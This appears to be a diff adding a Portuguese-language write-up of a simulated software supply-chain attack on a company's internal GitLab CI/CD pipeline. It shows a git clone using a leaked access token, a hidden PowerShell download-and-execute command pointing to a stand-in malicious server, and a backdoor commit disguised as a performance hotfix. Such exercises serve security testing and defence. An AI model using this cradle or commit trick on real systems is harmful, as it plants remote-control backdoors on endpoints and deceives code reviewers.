@@ -1,0 +1,21 @@
+Durante a simulação de comprometimento da cadeia de suprimentos, foi identificado que o ambiente da empresa utilizava repositórios Git privados hospedados no GitLab como parte do processo de CI/CD interno. Um dos repositórios, utilizado para empacotar e distribuir um agente cliente de software para endpoints internos, estava com permissões incorretamente atribuídas a um ex-funcionário cujo token de acesso pessoal (Personal Access Token) ainda estava ativo.
+
+A partir de um dump de credenciais vazadas em paste sites, o atacante obteve o token de acesso associado à conta de desenvolvedor. Com isso, conseguiu clonar o repositório privado diretamente:
+
+git clone https://oauth2
+:<token_de_acesso>@gitlab.empresa.local/devops/cliente-endpoint.git
+
+Após revisar o código, o atacante introduziu uma backdoor discreta dentro de um dos arquivos de dependência, criando uma chamada a um payload PowerShell embutido que era ativado no pós-instalação. A alteração foi feita no script de inicialização do instalador:
+
+powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://maliciousserver/back.ps1
+')"
+
+A modificação foi committada e empurrada ao branch de produção, já que o pipeline estava configurado para aceitar alterações do grupo de desenvolvedores sem revisão manual:
+
+git add .
+git commit -m "Hotfix de performance"
+git push origin master
+
+O pipeline foi acionado automaticamente via GitLab Runner, gerando um novo instalador distribuído para estações de trabalho por meio de políticas de atualização automatizadas (MSI em GPO).
+
+Assim, todos os endpoints internos que receberam a atualização também passaram a executar silenciosamente o backdoor do atacante, permitindo controle remoto e persistência.
